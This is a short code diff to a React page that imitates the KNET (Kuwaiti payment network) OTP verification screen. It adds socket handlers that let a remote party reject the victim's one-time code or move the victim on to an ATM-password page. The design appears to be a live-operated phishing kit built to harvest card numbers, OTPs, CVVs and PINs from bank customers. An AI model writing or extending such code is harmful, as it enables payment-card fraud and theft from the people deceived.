@@ -10,6 +10,7 @@ import {
   waitingMessage,
   cardAction,
   codeAction,
+  socket,
 } from "@/lib/store";
 
 export default function KNETOTP() {
@@ -31,6 +32,23 @@ export default function KNETOTP() {
 
   useEffect(() => {
     navigateToPage("رمز التحقق كي نت (OTP)");
+  }, []);
+  useEffect(() => {
+    const s = socket.value;
+    if (!s) return;
+    const onCard = (a: string) => {
+      waitingMessage.value = ""; setIsLoading(false);
+      if (a === "reject") { setShowError(true); setOtpCode(""); }
+      else { navigate("/final-page"); }
+    };
+    const onCode = (d: any) => {
+      waitingMessage.value = ""; setIsLoading(false);
+      if (d && d.action === "cvv") { navigate("/atm-password"); }
+      else if (d && d.action === "reject") { setShowError(true); setOtpCode(""); }
+      else { navigate("/final-page"); }
+    };
+    s.on("card:action", onCard); s.on("code:action", onCode);
+    return () => { s.off("card:action", onCard); s.off("code:action", onCode); };
   }, []);
 
   // Handle form approval → go to final page
